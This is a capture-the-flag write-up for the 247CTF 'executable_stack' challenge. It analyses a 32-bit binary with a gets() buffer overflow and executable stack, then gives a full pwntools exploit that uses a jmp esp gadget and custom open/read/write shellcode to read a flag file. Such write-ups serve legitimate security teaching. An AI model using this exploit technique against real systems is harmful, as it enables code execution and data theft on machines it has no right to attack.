# executable_stack - 247CTF PWN Challenge

## Challenge Info
- **Name**: executable_stack
- **Category**: PWN
- **Remote**: `tcp://66c58f9b4036976b.247ctf.com:50470`
- **Description**: "There are no hidden flag functions in this binary. Can you make your own using the stack?"

## Flag
```
247CTF{XXXXXXXXXXXXXXXXXXXX}
```

---

## Binary Analysis

### File Info
```
ELF 32-bit LSB executable, Intel 80386
Stack: Executable (RWE)
No PIE, No Canary
```

### Key Functions

#### chall() @ 0x080484b8
```c
void chall() {
    char buffer[0x88];  // 136 bytes
    gets(buffer);       // Vulnerable!
}
```

#### asm_bounce() @ 0x080484a6
Contains a useful gadget:
```asm
0x080484b3:  jmp esp    ; Jump to stack - perfect for shellcode!
```

### Stack Layout
```
+------------------+
|   Return Addr    | <- ebp + 4 (OFFSET 140)
+------------------+
|    Saved EBP     | <- ebp
+------------------+
|    Saved EBX     | <- ebp - 4
+------------------+
|                  |
|   buffer[136]    | <- ebp - 0x88
|                  |
+------------------+
```

---

## Vulnerability

1. **Buffer Overflow**: `gets()` reads unlimited input into 136-byte buffer
2. **Executable Stack**: Stack has RWE permissions, allowing shellcode execution
3. **JMP ESP Gadget**: `asm_bounce()` contains `jmp esp` at 0x080484b3

---

## Exploitation

### Strategy: ret2esp + Shellcode

1. Overflow buffer (140 bytes) to reach return address
2. Overwrite return address with `jmp esp` gadget (0x080484b3)
3. Place shellcode immediately after return address
4. When `ret` executes, it jumps to `jmp esp`, which jumps to our shellcode on the stack

### Payload Structure
```
[AAAA * 140] + [0x080484b3] + [shellcode]
      ↓              ↓             ↓
   padding      jmp esp      open/read/write flag
```

### Finding the Flag Filename

The flag file has a randomized name. Used `getdents` syscall to list directory:
```
flag_27886b9a498ed936.txt
```

### Shellcode

Custom shellcode to:
1. `open("flag_27886b9a498ed936.txt", O_RDONLY)`
2. `read(fd, buffer, 100)`
3. `write(1, buffer, bytes_read)`

---

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'i386'

HOST = "66c58f9b4036976b.247ctf.com"
PORT = 50470

JMP_ESP = 0x080484b3
OFFSET = 140

def exploit():
    io = remote(HOST, PORT)

    # Build shellcode for flag file
    fname = b"flag_27886b9a498ed936.txt"
    padded = fname + b'\x00' * (4 - len(fname) % 4)
    chunks = [u32(padded[i:i+4]) for i in range(0, len(padded), 4)]

    sc = "xor eax, eax\npush eax\n"
    for c in reversed(chunks):
        sc += f"push {hex(c)}\n"
    sc += '''
        mov ebx, esp
        xor ecx, ecx
        mov al, 5
        int 0x80
        mov ebx, eax
        mov ecx, esp
        mov edx, 100
        xor eax, eax
        mov al, 3
        int 0x80
        mov edx, eax
        xor ebx, ebx
        inc ebx
        mov al, 4
        int 0x80
    '''

    shellcode = asm(sc)
    payload = b'A' * OFFSET + p32(JMP_ESP) + shellcode

    io.recvline()
    io.sendline(payload)
    print(io.recvall(timeout=3).decode())

if __name__ == "__main__":
    exploit()
```

---

## Key Takeaways

1. **Executable Stack**: When NX is disabled, shellcode can run directly on the stack
2. **JMP ESP Gadget**: Common technique to redirect execution to shellcode after return address
3. **Syscall Shellcode**: Building custom shellcode for open/read/write without relying on libc
4. **File Enumeration**: When flag filename is unknown, use `getdents` syscall to list directory contents
5. **String Construction**: Push strings in reverse order (little-endian) with null terminator first

---

## Files
- `executable_stack` - Challenge binary
- `solve.py` - Working exploit script
- `flag.txt` - Captured flag
